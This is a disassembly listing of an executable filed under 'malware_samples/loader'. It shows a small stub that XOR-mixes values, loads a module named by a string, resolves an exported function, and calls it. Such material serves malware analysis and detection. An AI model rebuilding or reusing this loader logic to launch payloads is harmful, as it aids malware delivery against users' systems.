
malware_samples/loader/ac20be185f5e5d931516336e80d7c3fd3adda6519418877de50181acf6986873.exe:     file format pei-i386


Disassembly of section .pko:

18001000 <.pko>:
18001000:	83 ec 1c             	sub    $0x1c,%esp
18001003:	8b 44 24 28          	mov    0x28(%esp),%eax
18001007:	85 c0                	test   %eax,%eax
18001009:	74 19                	je     0x18001024
1800100b:	89 44 24 08          	mov    %eax,0x8(%esp)
1800100f:	0f b6 44 24 24       	movzbl 0x24(%esp),%eax
18001014:	89 44 24 04          	mov    %eax,0x4(%esp)
18001018:	8b 44 24 20          	mov    0x20(%esp),%eax
1800101c:	89 04 24             	mov    %eax,(%esp)
1800101f:	e8 dc ff ff ff       	call   0x18001000
18001024:	8b 44 24 20          	mov    0x20(%esp),%eax
18001028:	83 c4 1c             	add    $0x1c,%esp
1800102b:	c3                   	ret
1800102c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
18001030:	83 ec 1c             	sub    $0x1c,%esp
18001033:	8b 44 24 20          	mov    0x20(%esp),%eax
18001037:	80 38 00             	cmpb   $0x0,(%eax)
1800103a:	74 14                	je     0x18001050
1800103c:	83 c0 01             	add    $0x1,%eax
1800103f:	89 04 24             	mov    %eax,(%esp)
18001042:	e8 e9 ff ff ff       	call   0x18001030
18001047:	83 c4 1c             	add    $0x1c,%esp
1800104a:	83 c0 01             	add    $0x1,%eax
1800104d:	c3                   	ret
1800104e:	66 90                	xchg   %ax,%ax
18001050:	31 c0                	xor    %eax,%eax
18001052:	83 c4 1c             	add    $0x1c,%esp
18001055:	c3                   	ret
18001056:	2e 8d b4 26 00 00 00 	lea    %cs:0x0(%esi,%eiz,1),%esi
1800105d:	00 
1800105e:	66 90                	xchg   %ax,%ax
18001060:	56                   	push   %esi
18001061:	53                   	push   %ebx
18001062:	83 ec 14             	sub    $0x14,%esp
18001065:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
1800106c:	8b 5c 24 28          	mov    0x28(%esp),%ebx
18001070:	ff 15 6c 50 00 18    	call   *0x1800506c
18001076:	83 ec 04             	sub    $0x4,%esp
18001079:	89 c6                	mov    %eax,%esi
1800107b:	ff 15 68 50 00 18    	call   *0x18005068
18001081:	8b 15 00 40 00 18    	mov    0x18004000,%edx
18001087:	c7 04 24 01 20 00 18 	movl   $0x18002001,(%esp)
1800108e:	31 d6                	xor    %edx,%esi
18001090:	89 35 00 40 00 18    	mov    %esi,0x18004000
18001096:	8b 15 00 40 00 18    	mov    0x18004000,%edx
1800109c:	31 d0                	xor    %edx,%eax
1800109e:	a3 00 40 00 18       	mov    %eax,0x18004000
180010a3:	a1 00 40 00 18       	mov    0x18004000,%eax
180010a8:	83 f0 41             	xor    $0x41,%eax
180010ab:	a3 00 40 00 18       	mov    %eax,0x18004000
180010b0:	ff 15 60 50 00 18    	call   *0x18005060
180010b6:	89 c6                	mov    %eax,%esi
180010b8:	83 ec 04             	sub    $0x4,%esp
180010bb:	b8 01 00 00 00       	mov    $0x1,%eax
180010c0:	85 f6                	test   %esi,%esi
180010c2:	74 27                	je     0x180010eb
180010c4:	c7 44 24 04 0a 20 00 	movl   $0x1800200a,0x4(%esp)
180010cb:	18 
180010cc:	89 34 24             	mov    %esi,(%esp)
180010cf:	ff 15 5c 50 00 18    	call   *0x1800505c
180010d5:	83 ec 08             	sub    $0x8,%esp
180010d8:	85 c0                	test   %eax,%eax
180010da:	74 1c                	je     0x180010f8
180010dc:	85 db                	test   %ebx,%ebx
180010de:	ba 00 20 00 18       	mov    $0x18002000,%edx
180010e3:	0f 44 da             	cmove  %edx,%ebx
180010e6:	89 1c 24             	mov    %ebx,(%esp)
180010e9:	ff d0                	call   *%eax
180010eb:	83 c4 14             	add    $0x14,%esp
180010ee:	5b                   	pop    %ebx
180010ef:	5e                   	pop    %esi
180010f0:	c2 10 00             	ret    $0x10
180010f3:	2e 8d 74 26 00       	lea    %cs:0x0(%esi,%eiz,1),%esi
180010f8:	89 34 24             	mov    %esi,(%esp)
180010fb:	ff 15 58 50 00 18    	call   *0x18005058
18001101:	b8 02 00 00 00       	mov    $0x2,%eax
18001106:	83 ec 04             	sub    $0x4,%esp
18001109:	eb e0                	jmp    0x180010eb
1800110b:	90                   	nop
1800110c:	90                   	nop
1800110d:	90                   	nop
1800110e:	90                   	nop
1800110f:	90                   	nop
